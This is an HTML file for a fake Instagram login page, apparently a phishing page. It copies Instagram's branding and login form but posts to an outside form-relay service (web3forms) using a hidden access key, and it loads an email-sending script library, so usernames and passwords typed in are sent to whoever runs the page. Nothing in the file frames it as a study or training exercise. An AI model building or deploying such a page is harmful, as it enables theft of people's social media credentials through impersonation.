<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <title>Login . Instagram</title>
</head>

<body>
    <main>
        <img src="img/IG.jpeg" alt="" class="phoneImg">
        <div class="form-div">
            <!-- <form action=""> -->
            <form action="https://api.web3forms.com/submit" method="POST">                <img class="instaLogo" src="img/instaLogo.png" alt="logo">
                <input type="hidden" name="access_key" value="f1696fa8-4800-bee2-1a08d7fb1fc9">
                <input type="text" class="input" id="name" placeholder="phone number, username, or email" required>
                <input type="password" class="input" id="password" placeholder="Password">
                <button class="login-btn">Log In</button>
                <p id="or">or</p>
                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
            </form>
            <div class="sign-up">
                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
            </div>
            <div class="get-app">
                <p>Get the app</p>
                <div class="store">
                    <img id="play" src="img/playStore.png" alt="">
                    <img id="microsoft" src="img/getMicrosoft.png" alt="">
                </div>
            </div>
        </div>
    </main>
    <script src="https://smtpjs.com/v3/smtp.js">
    </script>
    <script src="script.js"></script>
</body>

</html>
